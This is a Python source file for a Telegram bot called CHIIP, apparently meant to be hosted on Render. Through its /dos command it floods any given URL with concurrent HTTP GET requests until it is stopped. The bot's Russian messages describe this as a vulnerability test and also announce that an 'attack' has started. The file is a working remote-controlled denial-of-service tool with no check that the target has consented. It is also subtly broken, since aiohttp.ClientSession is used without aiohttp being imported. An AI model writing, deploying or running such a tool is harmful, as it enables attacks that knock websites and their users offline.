import os
import asyncio
import logging
from aiohttp import web
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command

# --- НАСТРОЙКИ (Берем из переменных окружения Render) ---
API_TOKEN = os.getenv('BOT_TOKEN')
ADMIN_ID = int(os.getenv('ADMIN_ID', 0))

bot = Bot(token=API_TOKEN)
dp = Dispatcher()
stop_flag = False

# --- WEB SERVER ДЛЯ RENDER (Health Check) ---
async def handle(request):
    return web.Response(text="CHIIP System is Online 🚀")

async def start_web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    # Render передает порт в переменную окружения PORT
    port = int(os.getenv("PORT", 8080))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    print(f"Web server started on port {port}")

# --- ФУНКЦИОНАЛ БОТА ---
async def attack_logic(url, threads, message):
    global stop_flag
    stop_flag = False
    async with aiohttp.ClientSession() as session:
        count = 0
        while not stop_flag:
            tasks = [asyncio.create_task(session.get(url, timeout=2)) for _ in range(threads)]
            await asyncio.gather(*tasks, return_exceptions=True)
            count += threads
            if count % 1000 == 0: print(f"Sent: {count}")
            await asyncio.sleep(0.05)
    await message.answer(f"🛑 Тест завершен. Отправлено: {count}")

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    await message.answer("🤖 CHIIP на связи! Используй /dos -url- -потоки- для теста на уязвимости. Чтобы тест запустился, нужно писать команду строго в таком виде: /dos [URL] [КОЛИЧЕСТВО_ПОТОКОВ]
Например: /dos -ссылка- 50")

@dp.message(Command("dos"))
async def cmd_dos(message: types.Message):
    if message.from_user.id != ADMIN_ID: return
    args = message.text.split()
    if len(args) < 3: return await message.answer("Формат: /dos url threads")
    asyncio.create_task(attack_logic(args[1], int(args[2]), message))
    await message.answer(f"🔥 Атака запущена на {args[1]}")

@dp.message(Command("stop"))
async def cmd_stop(message: types.Message):
    global stop_flag
    stop_flag = True
    await message.answer("Останавливаю...")

# --- MAIN ---
async def main():
    logging.basicConfig(level=logging.INFO)
    # Запускаем веб-сервер в фоне
    asyncio.create_task(start_web_server())
    # Запускаем бота
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())